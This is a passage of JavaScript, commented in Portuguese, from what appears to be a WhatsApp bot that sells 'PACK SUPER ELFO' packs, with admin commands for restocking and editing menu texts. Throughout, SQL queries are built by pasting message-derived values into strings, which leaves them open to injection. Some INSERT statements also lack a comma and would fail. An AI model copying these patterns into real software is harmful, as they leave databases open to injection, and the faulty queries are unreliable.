        //#▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀ 
        //#▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀ 
        //#▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀ 
        //#▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀ 
        //#▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀ 
        //#▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀ 
        //#▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀ 




        //#▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀ 
        if (Mensagem_Texto.indexOf("/textomenuelfo===") > -1 && Adms.includes(Numero)) {
            try {
                msg = Mensagem_Texto.split("===")
                Array_Total_Igual = Mensagem_Texto.match(/\=/igm);

                if (msg[1] === "") {
                    Texto = `Comando inválido`
                    await DataBase_Better.prepare(`INSERT INTO MENSAGENS_ENVIARV3 (PROCESSADO,ID_CONTATO,TIPO,TEXTO,CONSTRUCAO_LISTMESSAGE_buttonText,CONSTRUCAO_LISTMESSAGE_title,CONSTRUCAO_LISTMESSAGE_rows,Caminho_arquivo,DATA_MS_INSERIDO) VALUES (
'0',
'${Mensagem_From}',
'sendText',
'${Texto}',
'CONSTRUCAO_LISTMESSAGE_buttonText',
'CONSTRUCAO_LISTMESSAGE_title',
'CONSTRUCAO_LISTMESSAGE_rows',
'Caminho_arquivo',
'${Date.now()}')`).run()
                    Item_Fila_Sendo_Processado = "0"; return; console.log(debugLine("FIM"));
                }
                TEXTO_MENU_ELFO = msg[1]
                TEXTO_MENU_ELFO = TEXTO_MENU_ELFO.replace(/\'/igm, "")
                await DataBase_Better.prepare(`UPDATE SISTEMA SET VALOR = '${TEXTO_MENU_ELFO}' WHERE PARAMETRO = 'TEXTO_MENU_ELFO'`).run()

                Texto = `*TEXTO DO MENU PACOTE SUPER ELFO ALTERADO COM SUCESSO!*`
                await DataBase_Better.prepare(`INSERT INTO MENSAGENS_ENVIARV3 (PROCESSADO,ID_CONTATO,TIPO,TEXTO,CONSTRUCAO_LISTMESSAGE_buttonText,CONSTRUCAO_LISTMESSAGE_title,CONSTRUCAO_LISTMESSAGE_rows,Caminho_arquivo,DATA_MS_INSERIDO) VALUES (
'0',
'${Mensagem_From}',
'sendText',
'${Texto}',
'CONSTRUCAO_LISTMESSAGE_buttonText',
'CONSTRUCAO_LISTMESSAGE_title',
'CONSTRUCAO_LISTMESSAGE_rows',
'Caminho_arquivo',
'${Date.now()}')`).run()
                Item_Fila_Sendo_Processado = "0"; return; console.log(debugLine("FIM"));
            } catch (error) {
                console.log(debugLine(`Erro = ${JSON.stringify(error)} | ${error}`))
                Texto = `Comando inválido`
                await DataBase_Better.prepare(`INSERT INTO MENSAGENS_ENVIARV3 (PROCESSADO,ID_CONTATO,TIPO,TEXTO,CONSTRUCAO_LISTMESSAGE_buttonText,CONSTRUCAO_LISTMESSAGE_title,CONSTRUCAO_LISTMESSAGE_rows,Caminho_arquivo,DATA_MS_INSERIDO) VALUES (
'0',
'${Mensagem_From}',
'sendText',
'${Texto}',
'CONSTRUCAO_LISTMESSAGE_buttonText',
'CONSTRUCAO_LISTMESSAGE_title',
'CONSTRUCAO_LISTMESSAGE_rows',
'Caminho_arquivo',
'${Date.now()}')`).run()
                Item_Fila_Sendo_Processado = "0"; return; console.log(debugLine("FIM"));
            }
        }
        //#-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳

        //#▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀ 
        if (Mensagem_Texto.indexOf("/textocomprouelfo===") > -1 && Adms.includes(Numero)) {
            try {
                msg = Mensagem_Texto.split("===")
                Array_Total_Igual = Mensagem_Texto.match(/\=/igm);

                if (msg[1] === "" || Array_Total_Igual.length != 3) {
                    Texto = `Comando inválido`
                    await DataBase_Better.prepare(`INSERT INTO MENSAGENS_ENVIARV3 (PROCESSADO,ID_CONTATO,TIPO,TEXTO,CONSTRUCAO_LISTMESSAGE_buttonText,CONSTRUCAO_LISTMESSAGE_title,CONSTRUCAO_LISTMESSAGE_rows,Caminho_arquivo,DATA_MS_INSERIDO) VALUES (
'0',
'${Mensagem_From}',
'sendText',
'${Texto}',
'CONSTRUCAO_LISTMESSAGE_buttonText',
'CONSTRUCAO_LISTMESSAGE_title',
'CONSTRUCAO_LISTMESSAGE_rows',
'Caminho_arquivo',
'${Date.now()}')`).run()
                    Item_Fila_Sendo_Processado = "0"; return; console.log(debugLine("FIM"));
                }
                MENSAGEM_AO_COMPRAR_ELFO = msg[1]
                MENSAGEM_AO_COMPRAR_ELFO = MENSAGEM_AO_COMPRAR_ELFO.replace(/\'/igm, "")
                await DataBase_Better.prepare(`UPDATE SISTEMA SET VALOR = '${MENSAGEM_AO_COMPRAR_ELFO}' WHERE PARAMETRO = 'MENSAGEM_AO_COMPRAR_ELFO'`).run()

                Texto = `*TEXTO A EXIBIR QUANDO CLIENTE COMPRAR PACOTE SUPER ELFO, ALTERADO COM SUCESSO!*`
                await DataBase_Better.prepare(`INSERT INTO MENSAGENS_ENVIARV3 (PROCESSADO,ID_CONTATO,TIPO,TEXTO,CONSTRUCAO_LISTMESSAGE_buttonText,CONSTRUCAO_LISTMESSAGE_title,CONSTRUCAO_LISTMESSAGE_rows,Caminho_arquivo,DATA_MS_INSERIDO) VALUES (
'0',
'${Mensagem_From}',
'sendText',
'${Texto}',
'CONSTRUCAO_LISTMESSAGE_buttonText',
'CONSTRUCAO_LISTMESSAGE_title',
'CONSTRUCAO_LISTMESSAGE_rows',
'Caminho_arquivo',
'${Date.now()}')`).run()
                Item_Fila_Sendo_Processado = "0"; return; console.log(debugLine("FIM"));
            } catch (error) {
                console.log(debugLine(`Erro = ${JSON.stringify(error)} | ${error}`))
                Texto = `Comando inválido`
                await DataBase_Better.prepare(`INSERT INTO MENSAGENS_ENVIARV3 (PROCESSADO,ID_CONTATO,TIPO,TEXTO,CONSTRUCAO_LISTMESSAGE_buttonText,CONSTRUCAO_LISTMESSAGE_title,CONSTRUCAO_LISTMESSAGE_rows,Caminho_arquivo,DATA_MS_INSERIDO) VALUES (
'0',
'${Mensagem_From}',
'sendText',
'${Texto}',
'CONSTRUCAO_LISTMESSAGE_buttonText',
'CONSTRUCAO_LISTMESSAGE_title',
'CONSTRUCAO_LISTMESSAGE_rows',
'Caminho_arquivo',
'${Date.now()}')`).run()
                Item_Fila_Sendo_Processado = "0"; return; console.log(debugLine("FIM"));
            }
        }
        //#-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳







        //addpackelfo===TUDO
        //#▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀ 
        if (Mensagem_Texto.indexOf("/addpackelfo===") > -1 && Adms.includes(Numero)) {

            Array_Total_Igual = Mensagem_Texto.match(/\=/igm);
            msg = Mensagem_Texto.split("===")

            if (msg[1] === "") {
                Texto = `Comando inválido`
                await DataBase_Better.prepare(`INSERT INTO MENSAGENS_ENVIARV3 (PROCESSADO,ID_CONTATO,TIPO,TEXTO,CONSTRUCAO_LISTMESSAGE_buttonText,CONSTRUCAO_LISTMESSAGE_title,CONSTRUCAO_LISTMESSAGE_rows,Caminho_arquivo,DATA_MS_INSERIDO) VALUES (
'0',
'${Mensagem_From}',
'sendText',
'${Texto}',
'CONSTRUCAO_LISTMESSAGE_buttonText',
'CONSTRUCAO_LISTMESSAGE_title',
'CONSTRUCAO_LISTMESSAGE_rows',
'Caminho_arquivo',
'${Date.now()}')`).run()
                Item_Fila_Sendo_Processado = "0"; return; console.log(debugLine("FIM"));
            }

            bMensagem_Texto = Mensagem_Texto.replace(/\'/igm, "")

            Array_Fila_Espera = []
            try {
                Texto = "ABASTECENDO PACK SUPER ELFO..."
                await DataBase_Better.prepare(`INSERT INTO MENSAGENS_ENVIARV3 (PROCESSADO,ID_CONTATO,TIPO,TEXTO,CONSTRUCAO_LISTMESSAGE_buttonText,CONSTRUCAO_LISTMESSAGE_title,CONSTRUCAO_LISTMESSAGE_rows,Caminho_arquivo,DATA_MS_INSERIDO) VALUES (
'0',
'${Mensagem_From}',
'sendText',
'${Texto}',
'CONSTRUCAO_LISTMESSAGE_buttonText',
'CONSTRUCAO_LISTMESSAGE_title',
'CONSTRUCAO_LISTMESSAGE_rows',
'Caminho_arquivo',
'${Date.now()}')`).run()

                Linhas = bMensagem_Texto.split("/addpackelfo===")
                Linhas.splice(0, 1);
                try {
                    Contagem_Abastecidas = 0

                    db = new sqlite3.Database(Diretorio_SQLITE_Principal);
                    db.serialize(async function () {
                        db.run("begin transaction");

                        for (var index = 0; index < Linhas.length; index++) {
                            Abastecendo = true

                            try {

                                Div = Linhas[index].split("===")

                                console.log(`Inserindo`)

                                MATERIAL = Div[0]
                                DATA_INSERIDO_MS = Date.now()

                                db.run(`INSERT INTO PACK_SUPER_ELFO (MATERIAL,DATA_INSERIDO_MS) VALUES ('${MATERIAL}','${DATA_INSERIDO_MS}') ON CONFLICT DO NOTHING`);
                                Contagem_Abastecidas = parseInt(Contagem_Abastecidas) + 1
                            } catch (error) {
                                console.log(error)

                                Texto = `*Ocorreu algum problema no abastecimento.*

Já tinha abastecido ${Contagem_Abastecidas}.

Erro: ${error}`
                                for await (adm of Adms) {
                                    await DataBase_Better.prepare(`INSERT INTO MENSAGENS_ENVIARV3_ADMS_GRUPOS (PROCESSADO,ID_CONTATO,TIPO,TEXTO,CONSTRUCAO_LISTMESSAGE_buttonText,CONSTRUCAO_LISTMESSAGE_title,CONSTRUCAO_LISTMESSAGE_rows,Caminho_arquivo,DATA_MS_INSERIDO) VALUES (
'0',
'${adm}@c.us'
'sendText',
'${Texto}',
'CONSTRUCAO_LISTMESSAGE_buttonText',
'CONSTRUCAO_LISTMESSAGE_title',
'CONSTRUCAO_LISTMESSAGE_rows',
'Caminho_arquivo',
'${Date.now()}')`).run()
                                }
                                Abastecendo = false
                                Item_Fila_Sendo_Processado = "0"; return; console.log(debugLine("FIM"));
                            }
                        }

                        if (Contagem_Abastecidas != 0) {
                            console.log("comitando")
                            db.run("commit");
                        }

                        Texto = `*ABASTECIMENTO FINALIZADO*

${Linhas.length} Pacotes Colocados para abastecimento.

${Contagem_Abastecidas} Pacotes Abastecidos.`
                        for await (adm of Adms) {
                            await DataBase_Better.prepare(`INSERT INTO MENSAGENS_ENVIARV3_ADMS_GRUPOS (PROCESSADO,ID_CONTATO,TIPO,TEXTO,CONSTRUCAO_LISTMESSAGE_buttonText,CONSTRUCAO_LISTMESSAGE_title,CONSTRUCAO_LISTMESSAGE_rows,Caminho_arquivo,DATA_MS_INSERIDO) VALUES (
'0',
'${adm}@c.us'
'sendText',
'${Texto}',
'CONSTRUCAO_LISTMESSAGE_buttonText',
'CONSTRUCAO_LISTMESSAGE_title',
'CONSTRUCAO_LISTMESSAGE_rows',
'Caminho_arquivo',
'${Date.now()}')`).run()
                        }
                        Abastecendo = false
                        Item_Fila_Sendo_Processado = "0"; return; console.log(debugLine("FIM"));
                    });
                } catch (error) {
                    Texto = `Erro === ${error}`
                    await DataBase_Better.prepare(`INSERT INTO MENSAGENS_ENVIARV3 (PROCESSADO,ID_CONTATO,TIPO,TEXTO,CONSTRUCAO_LISTMESSAGE_buttonText,CONSTRUCAO_LISTMESSAGE_title,CONSTRUCAO_LISTMESSAGE_rows,Caminho_arquivo,DATA_MS_INSERIDO) VALUES (
'0',
'${Mensagem_From}',
'sendText',
'${Texto}',
'CONSTRUCAO_LISTMESSAGE_buttonText',
'CONSTRUCAO_LISTMESSAGE_title',
'CONSTRUCAO_LISTMESSAGE_rows',
'Caminho_arquivo',
'${Date.now()}')`).run()
                    Item_Fila_Sendo_Processado = "0"; return; console.log(debugLine("FIM"));
                }
            } catch (error) {
                Texto = `Erro === ${error}`
                await DataBase_Better.prepare(`INSERT INTO MENSAGENS_ENVIARV3 (PROCESSADO,ID_CONTATO,TIPO,TEXTO,CONSTRUCAO_LISTMESSAGE_buttonText,CONSTRUCAO_LISTMESSAGE_title,CONSTRUCAO_LISTMESSAGE_rows,Caminho_arquivo,DATA_MS_INSERIDO) VALUES (
'0',
'${Mensagem_From}',
'sendText',
'${Texto}',
'CONSTRUCAO_LISTMESSAGE_buttonText',
'CONSTRUCAO_LISTMESSAGE_title',
'CONSTRUCAO_LISTMESSAGE_rows',
'Caminho_arquivo',
'${Date.now()}')`).run()
                Item_Fila_Sendo_Processado = "0"; return; console.log(debugLine("FIM"));
            }
            return
        }
        //#-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳



        //#▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀ 
        if ((Mensagem_Tipo).toString() === "list_response" && Mensagem_Texto.indexOf("🧝🏼‍♂️ PACK SUPER ELFO") > -1) {
            TEXTO_MENU_ELFO = await DataBase_Better.prepare(`SELECT VALOR FROM SISTEMA WHERE PARAMETRO = 'TEXTO_MENU_ELFO'`).get()["VALOR"]
            SALDO_USUARIO = await DataBase_Better.prepare(`SELECT SALDO FROM CONTATOS WHERE ID_CONTATO = '${Mensagem_From}'`).get()["SALDO"]
            SALDO_USUARIO = parseFloat(SALDO_USUARIO).toFixed(2)

            CONSTRUCAO_LISTMESSAGE_buttonText = "COMPRAR"
            CONSTRUCAO_LISTMESSAGE_title = `🧝🏼‍♂️ PACK SUPER ELFO 🧝🏼‍♂️`
            CONSTRUCAO_LISTMESSAGE_description = `🧝🏼‍♂️ *PACK SUPER ELFO* 🧝🏼‍♂️

◆ ━━━━❪✪❫━━━━ ◆
❖ *Seu número:* ${Numero}
❖ *Saldo Atual:* R\$: ${SALDO_USUARIO}
◆ ━━━━❪✪❫━━━━ ◆

${TEXTO_MENU_ELFO}`

            CONSTRUCAO_LISTMESSAGE_rows = []
            iD_Footer = Date.now()

            CONSTRUCAO_LISTMESSAGE_rows.push(
                {
                    rowId: `${iD_Footer.toString()}|`,
                    title: "📦 COMPRAR PACK SUPER ELFO",
                    description: " ",
                },
                {
                    rowId: `${iD_Footer.toString()}|`,
                    title: "🔙 MENU",
                    description: " ",
                }
            )

            await DataBase_Better.prepare(`INSERT INTO MENSAGENS_ENVIARV3 (PROCESSADO,ID_CONTATO,TIPO,TEXTO,CONSTRUCAO_LISTMESSAGE_buttonText,CONSTRUCAO_LISTMESSAGE_title,CONSTRUCAO_LISTMESSAGE_rows,Caminho_arquivo,DATA_MS_INSERIDO) VALUES (
'0',
'${Mensagem_From}',
'sendListMessage',
'${CONSTRUCAO_LISTMESSAGE_description}',
'${CONSTRUCAO_LISTMESSAGE_buttonText}',
'${CONSTRUCAO_LISTMESSAGE_title}',
'${JSON.stringify(CONSTRUCAO_LISTMESSAGE_rows)}',
'${iD_Footer}',
'${Date.now()}')`).run()
            Item_Fila_Sendo_Processado = "0"; return; console.log(debugLine("FIM"));
        }
        //#-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳



        //#▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀ 
        if ((Mensagem_Tipo).toString() === "list_response" && Mensagem_Texto.indexOf("📦 COMPRAR PACK SUPER ELFO") > -1) {

            Estoque = await DataBase_Better.prepare(`SELECT * FROM PACK_SUPER_ELFO`).all();
            if (Estoque.length === 0) {

                Texto = `⚠️ *INFELIZMENTE ESTAMOS SEM MATERIAL NO ESTOQUE*

⚙️ *NOSSA EQUIPE FOI NOTIFICADA* ⚙️

*Em breve o estoque será reabastecido*📦✅`
                await DataBase_Better.prepare(`INSERT INTO MENSAGENS_ENVIARV3 (PROCESSADO,ID_CONTATO,TIPO,TEXTO,CONSTRUCAO_LISTMESSAGE_buttonText,CONSTRUCAO_LISTMESSAGE_title,CONSTRUCAO_LISTMESSAGE_rows,Caminho_arquivo,DATA_MS_INSERIDO) VALUES (
'0',
'${Mensagem_From}',
'sendText',
'${Texto}',
'CONSTRUCAO_LISTMESSAGE_buttonText',
'CONSTRUCAO_LISTMESSAGE_title',
'CONSTRUCAO_LISTMESSAGE_rows',
'Caminho_arquivo',
'${Date.now()}')`).run()

                Texto = `⚠️ *ATENÇÃO ADM* ⚠️

Usuário: wa.me/${Numero}

Tentou efetuar a compra de PACK SUPER ELFO, mas o estoque está vazio!`
                for await (adm of Adms) {
                    await DataBase_Better.prepare(`INSERT INTO MENSAGENS_ENVIARV3_ADMS_GRUPOS (PROCESSADO,ID_CONTATO,TIPO,TEXTO,CONSTRUCAO_LISTMESSAGE_buttonText,CONSTRUCAO_LISTMESSAGE_title,CONSTRUCAO_LISTMESSAGE_rows,Caminho_arquivo,DATA_MS_INSERIDO) VALUES (
'0',
'${adm}@c.us',
'sendText',
'${Texto}',
